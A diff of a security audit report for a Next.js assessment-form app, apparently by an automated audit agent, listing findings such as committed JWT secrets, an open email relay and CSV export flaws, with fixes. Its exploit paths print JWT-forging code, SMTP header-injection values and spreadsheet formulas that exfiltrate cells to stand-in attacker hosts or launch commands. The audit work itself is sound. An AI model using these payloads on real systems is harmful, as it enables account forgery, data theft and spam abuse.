@@ -1,294 +1,506 @@
-# SECURITY AUDIT REPORT
+---
+mode: retroactive
+audited_date: 2026-08-03
+phase: assessmentform-express-spa-multi-step-as
+verdict: OPEN_THREATS
+threats_open: 3
+confirmed_high_critical: 3
+confirmed_medium: 4
+confirmed_low: 2
+---
 
-**Project:** assessmentform-express-spa-multi-step-as  
-**Phase:** Express (full application — 10 waves, 1 atomic commit)  
-**Mode:** Retroactive STRIDE  
-**Audited:** 2026-07-29  
-**Auditor:** pivota_spec security agent (claude-sonnet-4-6)  
-**Enforcement:** warn  
-**threats_open:** 3 (CRITICAL: 1, HIGH: 2), plus 4 lower-severity findings  
+# Security Audit — AssessmentForm Express SPA (Multi-Step Assessment Form)
+
+## Summary
+
+**Application:** Multi-Step Assessment Form SPA  
+**Stack:** Next.js 16 (App Router), TypeScript, PostgreSQL 16, Drizzle ORM 0.45, jose HS256 JWT  
+**Audit mode:** Retroactive (no plan-time threat model; STRIDE register built from source)  
+**Scope:** Full greenfield build on `develop` branch (~99 source files across 10 waves)  
+**Date:** 2026-08-03  
+**Auditor:** Automated security audit  
+
+### Verdict: `OPEN_THREATS`
+
+**3 CRITICAL/HIGH confirmed findings** — implementation must be remediated before production deployment.
+
+| Severity | Count |
+|----------|-------|
+| CRITICAL | 1 |
+| HIGH | 2 |
+| MEDIUM | 4 |
+| LOW | 2 |
+| INFO | 1 |
 
 ---
 
-## Executive Summary
+## Attack Surface Audited
 
-The Multi-Step Assessment Form SPA has solid core security controls: parameterized Drizzle ORM queries throughout, JWT signature validation on every protected route, server-side ownership enforcement on all respondent data paths, and role-based separation between the respondent and system-owner surfaces. No SQL injection or authentication bypass was found in the primary data flows.
-
-Three confirmed findings require remediation before production deployment:
-
-1. **CRITICAL** — `.env` and `.env.local` (containing JWT secrets and DB credentials) are committed to the git repository and tracked in every commit.  
-2. **HIGH** — `/api/notifications/email` is a publicly-accessible, unauthenticated HTTP endpoint. Any internet caller can trigger the email relay to send messages to arbitrary addresses.  
-3. **HIGH** — `docker-compose.yml` ships a hardcoded, well-known placeholder JWT secret (`change-me-to-a-cryptographically-random-256-bit-value`) which is trivially enumerable; if deployed as-is, all JWTs can be forged.
-
----
-
-## STRIDE Register
-
-### Attack Surface Enumerated
-
-| Surface Area | Method | Auth Guard |
-|---|---|---|
-| `POST /api/auth/login` | Email → system_owner JWT | None (public) |
-| `POST /api/sessions` | Email/name/team_type → respondent JWT | None (public) |
-| `GET /api/sessions/:sessionId` | Session hydration | jwtMiddleware + requireSessionOwner (HOF) |
-| `PUT /api/responses/:sessionId` | Auto-save answers | requireSessionOwner (direct) + assessmentOpenGuard |
-| `POST /api/submissions/:sessionId` | Finalize submission | requireSessionOwner (direct) + assessmentOpenGuard |
-| `GET /api/sections` | Section routing | jwtMiddleware (any role) |
-| `GET /api/sections/:sectionId/questions` | Question fetch | jwtMiddleware (any role) |
-| `GET /api/config` | View config | requireSystemOwner (direct) |
-| `PATCH /api/config` | Update due date | requireSystemOwner (direct) |
-| `GET /api/dashboard/responses` | Response list | requireSystemOwner (direct) |
-| `GET /api/dashboard/responses/:sessionId` | Response detail | requireSystemOwner (direct) |
-| `GET /api/dashboard/analytics` | Analytics data | requireSystemOwner (direct) |
-| `GET /api/dashboard/export/csv` | CSV export | requireSystemOwner (direct) |
-| `POST /api/notifications/email` | Email trigger | **NONE** |
-| `GET /api/health` | Health check | None (public) |
+| Area | Routes / Files | STRIDE | Verdict | Evidence |
+|------|----------------|--------|---------|----------|
+| Session creation (identity + JWT issuance) | `POST /api/sessions` | S, I, D | ✅ Auth OK; ⚠ No rate limit | `src/app/api/sessions/route.ts:32` |
+| Session owner middleware (respondent) | `lib/middleware/requireSessionOwner.ts` | S, E | ✅ Ownership enforced | `src/lib/middleware/requireSessionOwner.ts:93` |
+| Session read (lib/auth version) | `lib/auth/requireSessionOwner.ts` | E | ✅ Bypasses for SO but service layer re-validates email | `src/lib/session/sessionService.ts:196` |
+| Auto-save responses | `PUT /api/responses/[sessionId]` | T, E | ✅ Session ownership verified; ⚠ question_id not validated against session sections | `src/lib/services/responseService.ts:30` |
+| Submission finalize | `POST /api/submissions/[sessionId]` | T, E | ✅ Ownership + assessment guard correct | `src/app/api/submissions/[sessionId]/route.ts:35` |
+| System Owner login | `POST /api/auth/login` | S | ✅ Email-only auth by design; SO list from DB | `src/app/api/auth/login/route.ts:37` |
+| JWT signing / verification | `lib/auth/authService.ts` | S, T | ✅ HS256 + jose; ⚠ Placeholder secret in committed files | `drizzle/seed.ts`, `.env`, `docker-compose.yml` |
+| JWT storage | Client-side (localStorage) | I | ⚠ XSS-accessible JWT storage | `src/app/page.tsx:25`, `src/app/dashboard/login/page.tsx:42` |
+| Dashboard responses | `GET /api/dashboard/responses` | E, I | ✅ requireSystemOwner middleware applied | `src/app/api/dashboard/responses/route.ts:8` |
+| Dashboard response detail | `GET /api/dashboard/responses/[sessionId]` | E, I | ✅ requireSystemOwner middleware applied | `src/app/api/dashboard/responses/[sessionId]/route.ts:11` |
+| Dashboard analytics | `GET /api/dashboard/analytics` | E, I | ✅ requireSystemOwner; teamTypeFilter uses `inArray` (parameterized) | `src/lib/services/analyticsService.ts:13` |
+| CSV export | `GET /api/dashboard/export/csv` | E, I, T | ✅ requireSystemOwner; ⚠ formula injection in CSV output | `src/lib/services/csvExportService.ts:119` |
+| Config mutation | `PATCH /api/config` | T, E | ✅ requireSystemOwner; date validated | `src/app/api/config/route.ts:34` |
+| Email notification | `POST /api/notifications/email` | S, I | 🚨 **No auth guard** — publicly accessible | `src/app/api/notifications/email/route.ts:25` |
+| Assessment open guard | `lib/middleware/assessmentOpenGuard.ts` | T | ⚠ DB error fails open (continues) | `src/lib/middleware/assessmentOpenGuard.ts:48` |
+| Health endpoint | `GET /api/health` | I | ℹ️ Public; leaks DB connectivity state | `src/app/api/health/route.ts:9` |
+| Credential files in git | `.env`, `.env.local` | I | 🚨 **JWT secret + DB creds committed to repository** | `.env:1`, `.env.local:1` |
+| SQL injection (Drizzle ORM) | All services | T | ✅ Parameterized queries throughout; `ilike` is parameterized | `src/lib/services/dashboardService.ts:50` |
+| Sort column injection | `dashboardService.getResponseList` | T | ✅ Whitelist map with safe default | `src/lib/services/dashboardService.ts:59` |
+| Sort direction injection | `dashboardService.getResponseList` | T | ✅ Ternary guard: `=== 'asc' ? asc : desc` | `src/lib/services/dashboardService.ts:23` |
+| Zod input validation | `answerPayload.ts`, `sessions/route.ts` | T | ✅ Discriminated union covers all 6 types | `src/lib/schemas/answerPayload.ts:47` |
+| Security headers | `next.config.ts` | I | ⚠ No Content-Security-Policy header | `next.config.ts:11` |
+| CORS | None configured | S | ✅ Same-origin (Next.js App Router default) | N/A |
+| CSRF | None (Bearer token auth) | T | ✅ Bearer JWTs are not sent automatically by browsers | N/A |
 
 ---
 
 ## Confirmed Findings
 
-### FIND-01 — CRITICAL — Secrets Committed to Git Repository
+---
+
+### FINDING-01 — Credentials Committed to Git Repository
 
 | Field | Value |
-|---|---|
-| **ID** | FIND-01 |
+|-------|-------|
+| **ID** | FINDING-01 |
 | **Severity** | CRITICAL |
-| **STRIDE** | Information Disclosure / Spoofing |
-| **File:Line** | `.env:1`, `.env.local:1` (both tracked in git at commit `603993f`) |
+| **Category** | Information Disclosure (STRIDE: I) |
+| **Location** | `.env:1-3`, `.env.local:1-3`, `docker-compose.yml:31` |
+| **Status** | CONFIRMED |
 
-**Evidence:**  
-`git ls-files` confirms both `.env` and `.env.local` are tracked. `git show HEAD:.env` reveals:
+#### Description
+
+Two credential files containing live secrets are committed to and tracked by the git repository:
+
+1. **`.env`** (committed in commit `d16568d` and present in HEAD):
+   ```
+   JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
+   DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
+   ```
+
+2. **`.env.local`** (committed; same content as `.env`):
+   ```
+   JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
+   DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
+   ```
+
+3. **`docker-compose.yml:31`** contains a well-known placeholder as the production JWT secret:
+   ```
+   JWT_SECRET: change-me-to-a-cryptographically-random-256-bit-value
+   ```
+   This text-literal string would be used as-is if the container is deployed without override.
+
+Neither `.env` nor `.env.local` appear in `.gitignore`. Verification:
 ```
-JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
-DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
+git ls-files -- .env .env.local
+# Output: .env  .env.local  (both tracked)
 ```
-Neither file appears in `.gitignore` (confirmed by reading `.gitignore` — the file only ignores `.env` patterns for `node_modules/` and framework build artifacts, not root-level `.env*` files).
 
-**Exploit Path:**  
-Any user with git clone/pull access to the repository has the `JWT_SECRET`. With a known secret and the HS256 signing logic in `authService.ts:20`, an attacker can forge a `system_owner` JWT for any email, bypassing the `isSystemOwnerEmail` database check entirely and gaining full access to all dashboard endpoints, CSV export of all respondent PII, and the config PATCH endpoint.
+#### Exploit Path
 
-**Refutation attempt:**  
-The secret `uat-test-secret-32-chars-minimum-xxxxxxxx` appears to be a UAT/test value, not a production secret. However: (a) it is committed to the main development branch that drives the CI/deployment pipeline; (b) the docker-compose also ships a different but equally predictable placeholder; (c) if the same secret is used in any deployed environment, all tokens can be forged.
+1. **JWT Forgery (any branch reader):** An attacker with read access to the repository (or CI/CD logs) learns `JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx`. They forge a system_owner JWT with HS256: `{"role":"system_owner","email":"attacker@example.com","iat":…,"exp":…}` and gain full dashboard access, CSV export of all respondents, and `PATCH /api/config` to alter the assessment due date.
 
-**Fix:**  
-1. Immediately add `.env` and `.env.local` to `.gitignore`.  
-2. Rotate the JWT secret and database password in all deployed environments.  
-3. Consider purging the secret from git history (`git filter-repo` or BFG).  
-4. Add a pre-commit hook or CI check (e.g., `git-secrets`, `trufflehog`) to prevent secret commits.
+2. **Docker deployment with placeholder secret:** Any deployment of `docker-compose.yml` without explicitly overriding `JWT_SECRET` uses the placeholder string as the signing key. The placeholder is also public in the repository.
+
+3. **Database credential exposure:** `assessmentform_dev_password` is exposed in both the `.env` files and `docker-compose.yml`. If the database port is reachable (port 5432 is exposed in docker-compose), an attacker can connect directly.
+
+#### Fix
+
+1. **Immediately:** Rotate `JWT_SECRET` and database password in all environments.
+2. Add `.env` and `.env.local` to `.gitignore` and remove them from git history (`git filter-repo` or BFG Repo Cleaner).
+3. Replace `docker-compose.yml` JWT_SECRET value with an environment variable reference: `JWT_SECRET: ${JWT_SECRET:?JWT_SECRET must be set}`.
+4. Add a pre-commit hook or CI check (e.g., `git-secrets`, `truffleHog`, `gitleaks`) to prevent future secret commits.
+5. `.env.example` already documents the correct pattern; use that as the only committed reference.
 
 ---
 
-### FIND-02 — HIGH — Unauthenticated Email Relay Endpoint
+### FINDING-02 — Unauthenticated Public Email Relay Endpoint
 
 | Field | Value |
-|---|---|
-| **ID** | FIND-02 |
+|-------|-------|
+| **ID** | FINDING-02 |
 | **Severity** | HIGH |
-| **STRIDE** | Spoofing / Elevation of Privilege |
-| **File:Line** | `src/app/api/notifications/email/route.ts:25` |
+| **Category** | Spoofing / Elevation of Privilege (STRIDE: S, E) |
+| **Location** | `src/app/api/notifications/email/route.ts:25-41` |
+| **Status** | CONFIRMED |
 
-**Evidence:**  
-`POST /api/notifications/email` has zero authentication. The route handler directly calls `sendSubmissionConfirmation(parsed.data)` where `params.email` is taken verbatim from the request body. No call to `requireSystemOwner`, `jwtMiddleware`, or any other auth guard is present. Confirmed by searching for auth patterns in the file — count returned 0.
+#### Description
+
+`POST /api/notifications/email` is documented as "internal server-to-server only" but is a publicly accessible HTTP endpoint with **no authentication, no IP restriction, and no rate limiting**.
 
 ```typescript
-// route.ts:25 — no auth guard before this
+// src/app/api/notifications/email/route.ts:25
 export async function POST(request: NextRequest) {
-  // ... parses body and calls sendSubmissionConfirmation directly
+  // No requireSystemOwner, no jwtMiddleware — completely unauthenticated
+  const parsed = EmailNotificationSchema.safeParse(body);
+  // ...
+  sendSubmissionConfirmation(parsed.data);  // Forwards to EMAIL_RELAY_URL
+  return NextResponse.json({ sent: true }, { status: 200 });
 }
 ```
 
-`emailService.ts:39` shows the relay POSTs to `EMAIL_RELAY_URL` with `to: params.email` drawn directly from the request.
+The endpoint schema only validates:
+- `session_id`: UUID format (not verified to exist in DB)
+- `email`: RFC 5322 format — **caller-controlled destination address**
+- `name`: `min(1)` — no max length, no CRLF/injection stripping
+- `due_date`: `min(1)` — any string
 
-**Exploit Path:**  
-When `EMAIL_RELAY_URL` is configured (production deployment with email notifications enabled):
-```bash
-curl -X POST https://your-app/api/notifications/email \
-  -H "Content-Type: application/json" \
-  -d '{"session_id":"00000000-0000-0000-0000-000000000000","email":"victim@example.com","name":"Phisher","due_date":"2026-12-31"}'
+When `EMAIL_RELAY_URL` is configured in production, this endpoint:
+1. Forwards a crafted email to any `to:` address the caller specifies.
+2. The `name` field (rendered into email body via template literal) has no length cap or character sanitization — if the relay is SMTP-based, specially crafted `\r\n` sequences in `name` can perform **email header injection**.
+
+#### Exploit Path
+
+**Scenario A — Open email relay abuse (EMAIL_RELAY_URL set):**
 ```
-This sends a legitimate-looking "Assessment Submitted — Developer Platform Evaluation" email to any target address, using the application's email relay and `from` address. When `EMAIL_RELAY_URL` is not set the endpoint is a no-op, but the endpoint still accepts and processes the request publicly.
+POST /api/notifications/email
+Content-Type: application/json
 
-**Refutation attempt:**  
-The comment says "Internal server-to-server only." However, Next.js API routes have no network-layer isolation; there is no IP allowlist, no shared secret header, no service mesh authentication. The endpoint is equally reachable by external callers as by internal ones. In practice, `sendSubmissionConfirmation` is also called directly from `submissionService.ts:58` without going through this HTTP route, so the HTTP endpoint is redundant and serves no necessary purpose.
+{"session_id":"00000000-0000-0000-0000-000000000001",
+ "email":"victim@target.com",
+ "name":"AttackerName",
+ "due_date":"2026-12-01"}
+```
+→ The server sends an email from `noreply@assessmentform` to `victim@target.com` with the assessment branding. No authentication needed. Attackers can spam arbitrary addresses.
 
-**Fix:**  
-Option A (preferred): Remove `POST /api/notifications/email` entirely. Internal callers already invoke `emailService.sendSubmissionConfirmation()` directly.  
-Option B: Add `requireSystemOwner` or a shared internal secret header validated server-side.
+**Scenario B — SMTP header injection (via `name` field, if SMTP relay):**
+```
+"name": "X\r\nBcc: bulk-victim1@evil.com\r\nBcc: bulk-victim2@evil.com\r\nX-Injected: 1"
+```
+→ The email body template literal includes `name` verbatim without stripping control characters.
+
+#### Fix
+
+1. **Add authentication:** Apply `requireSessionOwner` (matching `session_id` to the calling JWT) or restrict the endpoint to internal calls only (e.g., using a shared `INTERNAL_SECRET` header verified server-side, or by removing the HTTP endpoint entirely and calling `emailService.ts` directly from `submissionService.ts`).
+2. **Validate session_id exists in DB** before sending.
+3. **Sanitize `name` field:** Strip `\r`, `\n`, and limit to 200 characters (matching respondents table constraint).
+4. If the endpoint must remain public, add rate limiting (e.g., 3 requests per IP per minute).
 
 ---
 
-### FIND-03 — HIGH — Hardcoded Weak JWT Secret in docker-compose.yml
+### FINDING-03 — Default Placeholder JWT Secret in docker-compose.yml
 
 | Field | Value |
-|---|---|
-| **ID** | FIND-03 |
+|-------|-------|
+| **ID** | FINDING-03 |
 | **Severity** | HIGH |
-| **STRIDE** | Spoofing |
-| **File:Line** | `docker-compose.yml:31` |
+| **Category** | Spoofing (STRIDE: S) |
+| **Location** | `docker-compose.yml:31` |
+| **Status** | CONFIRMED |
 
-**Evidence:**  
+#### Description
+
+The production `docker-compose.yml` hard-codes the JWT signing secret as the literal string `change-me-to-a-cryptographically-random-256-bit-value`:
+
 ```yaml
+# docker-compose.yml:31
 JWT_SECRET: change-me-to-a-cryptographically-random-256-bit-value
 ```
-This placeholder is committed as the default value for the production service definition. If a deployment team runs `docker-compose up` without overriding this value, all JWT signatures will use a publicly known, trivially guessable string.
 
-**Exploit Path:**  
-An attacker who knows this default value (from the public repository) can forge valid `system_owner` JWTs:
-```python
-import jwt  # PyJWT
-token = jwt.encode({"session_id": None, "email": "attacker@example.com", "role": "system_owner"}, 
-                   "change-me-to-a-cryptographically-random-256-bit-value", algorithm="HS256")
+This value is committed to the repository and is therefore publicly known. Any deployment that uses `docker-compose up` **without separately providing `JWT_SECRET`** will sign all JWTs with this known string. The weakness is compounded by FINDING-01, which also reveals `uat-test-secret-32-chars-minimum-xxxxxxxx` as the git-committed secret.
+
+Note: This is a separate finding from FINDING-01 because even if `.env`/`.env.local` are removed from git history, `docker-compose.yml` would still ship a known default.
+
+#### Exploit Path
+
+An attacker who reads the public git repository can construct a valid system_owner JWT signed with `change-me-to-a-cryptographically-random-256-bit-value`:
+
+```javascript
+import { SignJWT } from 'jose';
+const secret = new TextEncoder().encode('change-me-to-a-cryptographically-random-256-bit-value');
+const token = await new SignJWT({ session_id: null, email: 'attacker@x.com', role: 'system_owner' })
+  .setProtectedHeader({ alg: 'HS256' })
+  .setExpirationTime('8h')
+  .sign(secret);
+// → Valid system_owner JWT accepted by all requireSystemOwner-protected endpoints
 ```
-This token passes all `requireSystemOwner` checks, granting full dashboard access.
 
-**Refutation attempt:**  
-`authService.ts:8-10` validates that `JWT_SECRET` is present (throws if absent), but does not validate minimum entropy or reject the placeholder value. Deployment teams following the compose file as-written will ship a broken-by-design secret.
+#### Fix
 
-**Fix:**  
-1. Remove `JWT_SECRET` from `docker-compose.yml` entirely; require it as an external secret (Docker secret, environment injection, `.env` file not committed).  
-2. Add a startup check in `authService.ts` that rejects well-known placeholder strings (or enforces minimum length ≥ 32 bytes).  
-3. Add a `# REQUIRED: Generate with: openssl rand -hex 32` comment and fail fast if unchanged.
-
----
-
-## Lower-Severity Findings
-
-### FIND-04 — MEDIUM — No Server-Side Validation That question_id Belongs to Session's Assigned Sections
-
-| Field | Value |
-|---|---|
-| **ID** | FIND-04 |
-| **Severity** | MEDIUM |
-| **STRIDE** | Tampering |
-| **File:Line** | `src/app/api/responses/[sessionId]/route.ts:54-66`, `src/lib/services/responseService.ts:15-41` |
-
-**Evidence:**  
-`PUT /api/responses/:sessionId` validates the JWT and session ownership, but does not check that each submitted `question_id` belongs to a section in the respondent's `section_ids_ordered`. The `upsertResponses` service inserts any question UUID that passes Zod validation and satisfies the FK constraint (`question_id` → `questions.id`). Section membership is enforced only client-side.
-
-**Exploit Path:**  
-A respondent for team type `program_project` (assigned sections A, B, C) can craft a PUT request with `question_id` values from section D (a `platform_engineering`-only section), injecting answers for questions they were never shown. These answers appear in the dashboard under their session and are included in analytics aggregations, polluting cross-team analytics data.
-
-**Refutation attempt:**  
-Confirmed: no join between `session.section_ids_ordered` and `questions.section_id` exists in `responseService.ts`. The FK only ensures the question exists globally, not that it belongs to the respondent's routing.
-
-**Fix:**  
-In `upsertResponses`, load `session.section_ids_ordered` and verify each `question_id` belongs to one of those sections before insert.
-
----
-
-### FIND-05 — MEDIUM — CSV Export: No Formula Injection Defense
-
-| Field | Value |
-|---|---|
-| **ID** | FIND-05 |
-| **Severity** | MEDIUM |
-| **STRIDE** | Tampering (downstream — targets spreadsheet users) |
-| **File:Line** | `src/lib/services/csvExportService.ts:134-139` |
-
-**Evidence:**  
-`csv-stringify` is invoked with no options:
-```typescript
-stringify([row], (err, output) => { ... })
-```
-The default `csv-stringify` configuration does not escape or prefix formula-triggering characters (`=`, `@`, `+`, `-`, `\t`, `\r`). Free-text answers (`free_text_short` / `free_text_long`) can contain arbitrary strings up to 500/2000 characters.
-
-**Exploit Path:**  
-A respondent submits `=HYPERLINK("http://attacker.example/steal?d="&A1,"Click here")` as a free_text answer. When a system owner downloads and opens the CSV in Microsoft Excel or LibreOffice Calc, the formula executes in the spreadsheet context.
-
-**Refutation attempt:**  
-`flattenAnswerPayload` passes free_text values through `String(p.value ?? '')` without sanitization. The `csv-stringify` call confirms no `cast` or custom quote functions are configured.
-
-**Fix:**  
-Add a sanitization step in `flattenAnswerPayload` (or as a `cast` option to `csv-stringify`) that prepends a single quote (`'`) to any string beginning with `=`, `@`, `+`, `-`, `\t`, or `\r`.
-
----
-
-### FIND-06 — LOW — PostgreSQL Port 5432 Exposed to Host in docker-compose.yml
-
-| Field | Value |
-|---|---|
-| **ID** | FIND-06 |
-| **Severity** | LOW |
-| **STRIDE** | Elevation of Privilege |
-| **File:Line** | `docker-compose.yml:19-20` |
-
-**Evidence:**  
+Replace the hard-coded value with a mandatory environment variable reference:
 ```yaml
-ports:
-  - "5432:5432"
+JWT_SECRET: ${JWT_SECRET:?Error: JWT_SECRET must be set before starting the application}
 ```
-The database port is bound to all host interfaces. With the hardcoded credentials (`assessmentform` / `assessmentform_dev_password`) visible in the compose file, any network-adjacent host (or any host if deployed on a public IP without a firewall) can connect directly to the database.
-
-**Fix:**  
-Remove the `ports` mapping from the `db` service; the `app` service accesses `db` over the Docker network without host-level port exposure. If direct DB access is needed for development, use `127.0.0.1:5432:5432`.
+Document in `README` / `DEPLOYMENT.md` that operators must generate a cryptographically random 256-bit value (`openssl rand -hex 32`) before first run.
 
 ---
 
-### FIND-07 — LOW — JWT Tokens Stored in localStorage (XSS Exposure)
+### FINDING-04 — CSV Formula Injection (CSV Export)
 
 | Field | Value |
-|---|---|
-| **ID** | FIND-07 |
+|-------|-------|
+| **ID** | FINDING-04 |
+| **Severity** | MEDIUM |
+| **Category** | Tampering (STRIDE: T) |
+| **Location** | `src/lib/services/csvExportService.ts:13-34`, `src/lib/services/csvExportService.ts:119-127` |
+| **Status** | CONFIRMED |
+
+#### Description
+
+The CSV export at `GET /api/dashboard/export/csv` writes respondent-supplied data directly into CSV cells without sanitizing formula-injection characters. Fields at risk include:
+
+- `respondent_name` — up to 200 chars, validated only as `min(2)`
+- Free-text answers (`free_text_short` max 500, `free_text_long` max 2000)
+- `other_text` in choice answers (max 500)
+
+`csv-stringify` is used **without** the `cast` option that would escape leading `=`, `+`, `@`, or `-` characters. Verified:
+```javascript
+// node evaluation result:
+// stringify([['=HYPERLINK("http://evil.com",1)', '+cmd|calc']])
+// → "=HYPERLINK(""http://evil.com"",1)",+cmd|calc
+// The leading = is preserved; Excel/LibreOffice will execute the formula
+```
+
+#### Exploit Path
+
+A malicious respondent submits:
+- `name`: `=HYPERLINK("http://attacker.com/steal?c="&A1,"Click me")`  
+- Or a free-text answer: `=cmd|" /C calc"!A0`
+
+A System Owner downloads the CSV and opens it in Microsoft Excel or LibreOffice Calc. The spreadsheet application executes the formula, potentially:
+- Exfiltrating other cell values to an attacker-controlled server (HYPERLINK variant)
+- Executing OS commands (DDE variant on older Excel)
+
+**Severity is MEDIUM** because it requires the System Owner to open the CSV in a spreadsheet application and click through a security warning (modern Excel prompts before executing DDE/external links).
+
+#### Fix
+
+Apply formula injection sanitization in `flattenAnswerPayload` and for all respondent-name / email values before writing to CSV:
+
+```typescript
+function sanitizeCsvCell(value: string): string {
+  // Escape leading formula characters per OWASP CSV Injection guidance
+  if (value && ['+', '-', '=', '@', '\t', '\r'].includes(value[0])) {
+    return `'${value}`;  // Prefix with single-quote to defang formula
+  }
+  return value;
+}
+```
+
+Apply this to all user-supplied string fields before inclusion in CSV rows.
+
+---
+
+### FINDING-05 — JWT Tokens Stored in localStorage (XSS Exposure)
+
+| Field | Value |
+|-------|-------|
+| **ID** | FINDING-05 |
+| **Severity** | MEDIUM |
+| **Category** | Information Disclosure (STRIDE: I) |
+| **Location** | `src/app/page.tsx:25`, `src/app/page.tsx:48`, `src/app/dashboard/login/page.tsx:42` |
+| **Status** | CONFIRMED |
+
+#### Description
+
+Both respondent and System Owner JWTs are stored in `localStorage`:
+- `localStorage.getItem('af_token')` — respondent JWT (24h expiry)
+- `localStorage.setItem('dashboard_token', data.token)` — system_owner JWT (8h expiry)
+
+`localStorage` is accessible to any JavaScript executing on the same origin, including injected scripts from XSS vulnerabilities (e.g., in third-party dependencies, DOM-based XSS in rendered content). There is no `HttpOnly` cookie protection.
+
+While no direct XSS vector was found in the current codebase, the absence of a Content Security Policy (FINDING-06) increases risk: a successful XSS attack would immediately yield both tokens.
+
+A stolen system_owner JWT grants full dashboard access, CSV data export, and config mutation. A stolen respondent JWT allows reading and submitting another user's assessment.
+
+#### Fix
+
+1. **Preferred:** Migrate to `HttpOnly` + `SameSite=Strict` cookies for JWT storage. This eliminates XSS token theft.
+2. **Mitigating:** Implement a strict Content-Security-Policy header (see FINDING-06) to reduce XSS attack surface.
+3. Reduce JWT lifetime: system_owner tokens at 8h are appropriate, but consider shorter lifetimes for sensitive operations.
+
+---
+
+### FINDING-06 — No Content Security Policy (CSP) Header
+
+| Field | Value |
+|-------|-------|
+| **ID** | FINDING-06 |
+| **Severity** | MEDIUM |
+| **Category** | Information Disclosure / Tampering (STRIDE: I, T) |
+| **Location** | `next.config.ts:11-25` |
+| **Status** | CONFIRMED |
+
+#### Description
+
+The security headers configured in `next.config.ts` include `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `X-XSS-Protection: 1; mode=block`, and `Referrer-Policy`, but **no `Content-Security-Policy` header**:
+
+```typescript
+// next.config.ts:15-22
+headers: [
+  { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
+  { key: 'X-Content-Type-Options', value: 'nosniff' },
+  { key: 'X-XSS-Protection', value: '1; mode=block' },
+  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
+  // ← No Content-Security-Policy
+],
+```
+
+`X-XSS-Protection` is deprecated in modern browsers (Chrome removed it in v78). Without CSP, the application has no defense-in-depth against XSS attacks, and a successful XSS would have unfettered access to localStorage (including JWTs — see FINDING-05).
+
+#### Fix
+
+Add a `Content-Security-Policy` header in `next.config.ts`. A baseline for this Next.js application:
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{NONCE}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'self'; form-action 'self';
+```
+
+For Next.js 13+ App Router, implement CSP nonces via middleware (see Next.js CSP documentation). Remove the deprecated `X-XSS-Protection` header.
+
+---
+
+### FINDING-07 — No Rate Limiting on Session Creation or Login Endpoints
+
+| Field | Value |
+|-------|-------|
+| **ID** | FINDING-07 |
+| **Severity** | MEDIUM |
+| **Category** | Denial of Service / Information Disclosure (STRIDE: D, I) |
+| **Location** | `src/app/api/sessions/route.ts:32`, `src/app/api/auth/login/route.ts:14` |
+| **Status** | CONFIRMED |
+
+#### Description
+
+Neither `POST /api/sessions` nor `POST /api/auth/login` have any rate limiting, CAPTCHA, or abuse prevention. These endpoints:
+
+1. **`POST /api/sessions`** — performs a DB lookup for every request (case-insensitive email query + potential insert). Without rate limiting, an attacker can:
+   - Enumerate whether a given email is a system owner (the endpoint returns `SYSTEM_OWNER_CANNOT_RESPOND` for blocked emails, revealing SO membership indirectly).
+   - Flood the respondents table with junk records.
+   - Exhaust DB connection pool (max 20 connections configured).
+
+2. **`POST /api/auth/login`** — queries `system_owner_emails` for each request. Returns distinct error codes: `NOT_A_SYSTEM_OWNER` vs `200 OK`. An attacker can brute-force the system owner email list.
+
+#### Fix
+
+1. Add IP-based rate limiting on these endpoints (e.g., 10 requests/minute per IP using `@upstash/ratelimit` or an nginx/edge rate-limit rule).
+2. Consider implementing consistent response timing to prevent timing-based user enumeration.
+3. For production deployment, place these endpoints behind an edge WAF or load balancer with rate-limit capability.
+
+---
+
+### FINDING-08 — assessmentOpenGuard Fails Open on Database Errors
+
+| Field | Value |
+|-------|-------|
+| **ID** | FINDING-08 |
 | **Severity** | LOW |
-| **STRIDE** | Information Disclosure |
-| **File:Line** | `src/app/page.tsx:25,48`, `src/app/dashboard/login/page.tsx:42`, `src/app/(assessment)/assessment/page.tsx:19` |
+| **Category** | Tampering (STRIDE: T) |
+| **Location** | `src/lib/middleware/assessmentOpenGuard.ts:48-51` |
+| **Status** | CONFIRMED |
 
-**Evidence:**  
-Both the respondent JWT (`af_token`) and the system-owner JWT (`dashboard_token`) are stored in `localStorage`. Any successful XSS attack on the application origin can read both tokens, allowing full impersonation.
+#### Description
 
-**Note:** The application does not use `httpOnly` cookies for token storage. The security headers in `next.config.ts` include `X-Content-Type-Options` and `Referrer-Policy` but no `Content-Security-Policy`.
+When the assessment config cannot be read from the database, `assessmentOpenGuard` silently treats the assessment as open:
 
-**Refutation attempt:**  
-No `eval()`, `dangerouslySetInnerHTML`, or dynamic `innerHTML` assignment was found in a cursory search of the frontend code, suggesting low XSS surface. However, third-party dependencies and future code changes make `localStorage` a structural risk. The absence of a `Content-Security-Policy` header reduces the defense-in-depth available.
+```typescript
+// src/lib/middleware/assessmentOpenGuard.ts:48-51
+} catch {
+  // Guard failure is treated as open to not block respondents on DB errors
+  // The actual save/submit will surface DB errors if they persist
+  return { ok: true };
+}
+```
 
-**Fix:**  
-Migrate token storage to `httpOnly; Secure; SameSite=Strict` cookies. Add a `Content-Security-Policy` header to `next.config.ts`.
+If a transient DB error occurs precisely at the due date boundary, a respondent could save answers or submit an assessment that should have been closed. This is a deliberate design trade-off (UX over strict enforcement) but constitutes a security boundary that can be bypassed by inducing DB errors.
 
----
+#### Fix
 
-## Verified-Safe Items
-
-| Area | STRIDE | Verdict | Evidence |
-|---|---|---|---|
-| SQL injection via Drizzle ORM | Tampering | SAFE | All queries use parameterized Drizzle builder; raw `sql\`...\`` tagged templates use `${variable}` binding, not string concatenation. `authService.ts:42`, `analyticsService.ts:91-108`. |
-| IDOR on `GET /api/sessions/:sessionId` | Information Disclosure | SAFE | `requireSessionOwner` HOF checks `respondent_email.toLowerCase() === req.user.email.toLowerCase()` before calling `getSessionById`, which performs a second ownership check. `auth/requireSessionOwner.ts:38`, `sessionService.ts:196`. |
